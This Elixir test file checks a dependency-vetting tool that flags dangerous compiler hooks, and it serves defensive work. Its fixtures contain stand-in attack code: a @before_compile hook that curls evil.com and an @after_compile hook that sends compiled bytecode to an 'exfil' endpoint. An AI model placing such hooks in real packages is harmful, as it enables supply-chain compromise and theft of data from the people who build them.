defmodule VetCore.Checks.CompilerHooksTest do
  use ExUnit.Case

  alias VetCore.Checks.CompilerHooks
  alias VetCore.Types.Dependency

  @project_dir Path.expand("../fixtures/compiler_hooks_project", __DIR__)
  @fixture_dir Path.join([@project_dir, "deps", "hook_dep"])

  setup_all do
    File.mkdir_p!(Path.join(@fixture_dir, "lib"))

    # Write a file with @before_compile
    File.write!(Path.join([@fixture_dir, "lib", "before_compile_mod.ex"]), """
    defmodule BeforeCompileMod do
      @before_compile __MODULE__

      def __before_compile__(env) do
        System.cmd("curl", ["http://evil.com"])
      end
    end
    """)

    # Write a file with @after_compile. The callback body MUST call something
    # the check treats as compile-time-dangerous (System.cmd / Code.eval /
    # :erlang.binary_to_term / Port.open / HTTP client) — the new check no
    # longer flags the hook's presence alone, since every Phoenix view uses
    # @before_compile for harmless codegen.
    File.write!(Path.join([@fixture_dir, "lib", "after_compile_mod.ex"]), """
    defmodule AfterCompileMod do
      @after_compile __MODULE__

      def __after_compile__(_env, bytecode) do
        System.cmd("curl", ["-d", inspect(bytecode), "http://evil.test/exfil"])
      end
    end
    """)

    # Write a file with @external_resource
    File.write!(Path.join([@fixture_dir, "lib", "external_resource_mod.ex"]), """
    defmodule ExternalResourceMod do
      @external_resource Path.join(__DIR__, "priv/data.json")

      def data, do: :ok
    end
    """)

    # Write a mix.exs with custom compilers
    File.write!(Path.join(@fixture_dir, "mix.exs"), """
    defmodule CompilerHooksFixture.MixProject do
      use Mix.Project

      def project do
        [
          app: :compiler_hooks_fixture,
          compilers: [:my_custom_compiler] ++ Mix.compilers()
        ]
      end
    end
    """)

    # Write a benign file for baseline comparison
    File.write!(Path.join([@fixture_dir, "lib", "benign.ex"]), """
    defmodule Benign do
      def hello, do: :world
    end
    """)

    on_exit(fn ->
      File.rm_rf!(@project_dir)
    end)

    :ok
  end

  defp run_check do
    dep = %Dependency{name: :hook_dep, version: "1.0.0", source: :hex}
    CompilerHooks.run(dep, @project_dir, [])
  end

  test "@before_compile is detected" do
    findings = run_check()

    before_compile_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.description, "@before_compile")
      end)

    assert length(before_compile_findings) >= 1

    finding = hd(before_compile_findings)
    assert finding.check_id == :compiler_hooks
    assert finding.category == :compiler_hooks
    assert finding.severity == :critical
  end

  test "@after_compile is detected" do
    findings = run_check()

    after_compile_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.description, "@after_compile")
      end)

    assert length(after_compile_findings) >= 1

    finding = hd(after_compile_findings)
    assert finding.check_id == :compiler_hooks
    assert finding.severity == :critical
  end

  test "@external_resource is detected with info severity" do
    findings = run_check()

    ext_resource_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.description, "@external_resource")
      end)

    assert length(ext_resource_findings) >= 1

    # @external_resource is informational — the file read itself (if any) is
    # caught by the file_access check. The attribute only tells the compiler
    # to recompile when the path changes; it doesn't execute code by itself.
    finding = hd(ext_resource_findings)
    assert finding.severity == :info
  end

  test "custom compilers in mix.exs are detected" do
    findings = run_check()

    compiler_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.description, "Mix.compilers()")
      end)

    assert length(compiler_findings) >= 1
  end

  test "benign module produces no compiler_hooks findings (baseline)" do
    # For comparison: a simple module with no hooks should produce no findings
    findings = run_check()

    benign_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.file_path, "benign.ex")
      end)

    assert benign_findings == []
  end

  describe "custom compilers — keyword-only form (no Mix.compilers() call)" do
    # The existing "custom compilers in mix.exs are detected" test passes because
    # the fixture also contains `++ Mix.compilers()`, which the `match_compilers_call`
    # matcher catches. That masks whether `match_custom_compilers` actually fires
    # on the `compilers: [...]` keyword itself. This test isolates the keyword form.
    @isolated_project Path.expand("../fixtures/compiler_hooks_keyword_only", __DIR__)
    @isolated_dep Path.join([@isolated_project, "deps", "keyword_dep"])

    setup do
      File.mkdir_p!(Path.join(@isolated_dep, "lib"))

      File.write!(Path.join([@isolated_dep, "lib", "ok.ex"]), """
      defmodule Ok do
        def noop, do: :ok
      end
      """)

      # mix.exs with a custom compiler declared as a plain keyword — NO call
      # to `Mix.compilers()`, so only the keyword-form matcher can surface it.
      File.write!(Path.join(@isolated_dep, "mix.exs"), """
      defmodule KeywordDep.MixProject do
        use Mix.Project

        def project do
          [app: :keyword_dep, compilers: [:my_evil_compiler, :elixir]]
        end
      end
      """)

      on_exit(fn -> File.rm_rf!(@isolated_project) end)
      :ok
    end

    test "detects `compilers: [...]` keyword in mix.exs without an accompanying call" do
      dep = %Dependency{name: :keyword_dep, version: "1.0.0", source: :hex}
      findings = CompilerHooks.run(dep, @isolated_project, [])

      # Claim under attack: the keyword form alone is sufficient to surface a
      # :compiler_hooks finding. If this fails, `match_custom_compilers` is dead
      # code (its pattern expects a 3-tuple but keyword entries are 2-tuples).
      keyword_findings =
        Enum.filter(findings, fn f ->
          String.contains?(f.description, "Custom compilers defined in mix.exs")
        end)

      assert keyword_findings != [],
             "expected a compiler_hooks finding from the `compilers:` keyword alone; " <>
               "got #{length(findings)} total findings: " <>
               inspect(Enum.map(findings, & &1.description))
    end
  end
end
